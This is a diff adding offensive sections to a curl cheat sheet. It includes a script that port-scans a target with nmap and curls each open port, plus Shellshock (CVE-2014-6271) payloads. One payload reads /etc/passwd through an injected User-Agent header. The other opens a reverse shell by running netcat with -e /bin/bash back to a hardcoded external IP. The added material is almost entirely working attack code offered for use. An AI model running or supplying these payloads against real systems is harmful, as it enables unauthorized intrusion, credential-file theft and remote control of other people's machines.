@@ -1,5 +1,45 @@
 # curl 
 
+### curl scan
+
+```sh
+#!/bin/bash
+
+if [ $# == 0 ] ; then
+    echo "Usage: ./curlScan.sh <IP ADDRESS>"
+    exit 1;
+fi
+
+echo "Starting Curl Scan"
+echo "Scanning for open ports:"
+nmap -Pn -sS -T 4 "$1" -p- | grep "^[0-9]" | cut -d "/" -f1 | tee /tmp/portList
+echo "Now attempting to retrieve information:"
+while read line; do
+        echo "Results for $line:"
+        timeout 1 curl "$1":"$line"
+        if [ $? -eq 124 ]; then
+                echo "  "
+        fi
+done < /tmp/portList
+
+echo "Curl Scan Terminated"
+rm /tmp/portList
+```
+
+
+### Shellshock == CVE-2014-6271
+
+#### Classic PoC
+```sh
+curl -H "User-Agent: () { :; }; /bin/command" http://example.com/
+() {:;}; /bin/cat /etc/passwd
+```
+
+#### Reverse Shell
+```sh
+curl -H "User-Agent: () { :;};echo content-type:text/plain;echo;/bin/nc 51.75.29.235 2222 -e /bin/bash;echo;exit" http://vuln.com/script.cgi
+```
+
 ### Get your external IP address
 ```sh
 curl ifconfig.me
